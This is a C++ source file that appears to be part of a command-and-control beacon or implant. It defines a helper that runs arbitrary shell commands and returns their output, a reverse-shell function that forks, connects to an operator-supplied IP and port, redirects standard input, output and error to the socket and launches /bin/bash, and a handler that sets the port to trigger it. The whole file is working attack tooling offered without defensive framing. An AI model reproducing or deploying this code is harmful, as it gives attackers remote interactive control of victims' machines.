#include <string>
#include <vector>
#include <array>
#include <include/beacon.hpp>
#include <arpa/inet.h>
#include <unistd.h>

typedef std::vector<std::string> ARGS;

std::string exec(const char* cmd){
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        result = "popen() failed!";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


int revshell(int port){
    if (fork() == 0){
        struct sockaddr_in sa;
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(get_ip_addr());
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        sleep(1);
        if (connect(sockfd, (struct sockaddr*)&sa, sizeof(sa)) != 0){
            return 101;
        }
        
        dup2(sockfd, 0); //bind stdin to sock
        dup2(sockfd, 1); //bind stdout to sock
        dup2(sockfd, 2); //bind stderr to sock

        char *const argv[] = {"/bin/bash", NULL};
        execve("/bin/bash", argv, NULL);
        exit(0);
    }
    return 0;
}

int port;
int get_port(){
    return port;
}

int rs(ARGS args){
    if (args.size() != 1){
        return 1;
    }
    int p;
    try {
        p = std::stoi(args[0]);
    }
    catch (...){
        return 1;
    }
    port = p;
    return 99; //stop accept signal
}